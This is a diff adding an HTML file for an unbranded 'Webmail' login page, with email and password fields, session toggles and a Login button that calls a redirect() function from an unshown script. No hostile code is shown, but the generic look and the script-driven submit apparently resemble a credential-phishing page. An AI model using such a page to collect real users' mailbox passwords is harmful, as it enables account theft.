@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
+    <title>Webmail :: Welcome to Webmail</title>
+</head>
+<body class="bg-[#3c3b3b]">
+    <div class="min-w-sm md:mt-[100px] flex justify-center md:w-[450px] md:h-[400px] md:mx-auto flex-row mt-[50px] bg-white p-5 h-[95vh]">
+        <form action="" id="form" class="relative">
+        <div class="md:mt-6 md:pl-6 flex flex-col justify-center gap-6">
+            <div class="flex gap-4 flex-col">
+                <div class="flex flex-col gap-1">
+                    <label  class="text-sm">E-mail address</label>
+                    <input type="email" id="email" class="md:w-[350px] border-2 h-8 p-2 shadow-sm focus:outline-none focus:ring-1 focus:ring-purple-400 " required>
+                </div>
+    
+                <div class="flex flex-col gap-1">
+                    <label for="" class="text-sm">Passwoord</label>
+                    <input type="password" id="password" class="md:w-[350px] border-2 h-8 p-2 shadow-sm focus:outline-none focus:ring-1 focus:ring-purple-400" required>
+                </div>
+            </div>
+
+            <div class="flex flex-col gap-4 md:gap-10">
+                <div class="flex">
+                    <div class="absolute -left-2 md:top-[160px] md:left-[5px]">
+                        <button id="btn" class="absolute top-5 left-5 w-6 h-4 md:w-6 md:h-4 rounded-2xl bg-[#0A109C] flex items-center transition
+                        duration-300 focus:outline-none shadow">
+                        <div id="switch-toggle" class="w-4 h-4 md:w-4 md:h-4 relative rounded-full transition duration-500 transform bg-white
+                        -translate-x-2 p-1 text-white">
+                
+                        </div> 
+                        </button> 
+                    </div>
+                    <p class="text-sm font-normal pl-10 md:pl-8 pt-4 md:pt-0 text-nowrap">Shared computer - log me out after 4 hours</p>
+                </div>
+
+                <div class="flex mt-4">
+                    <div class="absolute -left-2 top-[220px] md:top-[235px] md:left-[5px]">
+                        <button id="btn-a" class="absolute top-5 left-5 w-6 h-4 md:w-6 md:h-4 rounded-2xl bg-[#0A109C] flex items-center transition
+                        duration-300 focus:outline-none shadow">
+                        <div id="switch-toggle-a" class="w-4 h-4 md:w-4 md:h-4 relative rounded-full transition duration-500 transform bg-white
+                        -translate-x-2 p-1 text-white">
+                
+                        </div> 
+                        </button> 
+                    </div>
+                    <p class="text-sm font-normal pl-10 md:pl-8">Keep me logged in until I log out</p>
+                </div>
+            </div>
+            <div class="flex justify-center md:mt-6 mt-8">
+                <button type="submit" class="bg-[#0A109C] w-[195px] py-2 inline-block text-white rounded-md align-middle" onclick="redirect()">Login</button>
+            </div>
+           
+        </div>
+        </form>
+    </div>
+
+    
+
+    <script src="main.js"></script>
+</body>
+</html>
